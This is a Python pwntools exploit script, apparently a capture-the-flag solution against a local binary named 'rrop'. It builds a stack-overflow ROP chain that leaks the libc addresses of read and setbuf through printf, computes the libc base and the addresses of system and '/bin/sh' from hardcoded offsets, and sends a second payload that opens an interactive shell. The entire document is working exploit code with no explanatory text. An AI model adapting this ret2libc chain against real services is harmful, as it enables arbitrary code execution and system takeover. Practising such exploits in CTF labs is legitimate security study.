from pwn import *
s = process('./rrop')
raw_input('debug')
useful_func  =0x4007ce 
pop_rdi = 0x00000000004008b3
pop_rsi = 0x00000000004008b1
pop_rbp = 0x0000000000400698
zero_eax_leave_ret = 0x000000000040083d
ret = 0x00000000004005b6 
printf_plt = 0x4005d0
read_plt = 0x4005f0
read_got = 0x601028
setbuf_got = 0x601038
main = 0x4007e5 
s.recvuntil("@")
buf = int(s.recv(14),16)
log.info("buf: 0x%x" % buf)
pl = ''
pl = pl.ljust(0xd8,'a')
pl += p64(ret)
pl += p64(pop_rdi)
pl += p64(read_got)
pl += p64(printf_plt)
pl += p64(pop_rbp)
pl += p64(buf+0x118-16)
pl += p64(zero_eax_leave_ret)
pl += p64(pop_rdi)  
pl += p64(setbuf_got)
pl += p64(printf_plt)
pl += p64(ret)
pl += p64(main)
s.sendlineafter("my process.\n",pl)
read = u64(s.recv(6)+'\x00'*2)
setbuf = u64(s.recv(6)+'\x00'*2)
log.info("read: 0x%x"%read) 
log.info("setbuf: 0x%x"%setbuf)
read_offset = 0x110180
system_offset = 0x4f4e0
binsh_offset = 0x1b40fa
base = read - read_offset
system = base + system_offset
binsh = base + binsh_offset

pl2 = 'a'*0xd8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
s.sendlineafter("my process.\n",pl2)
s.interactive()
s.close()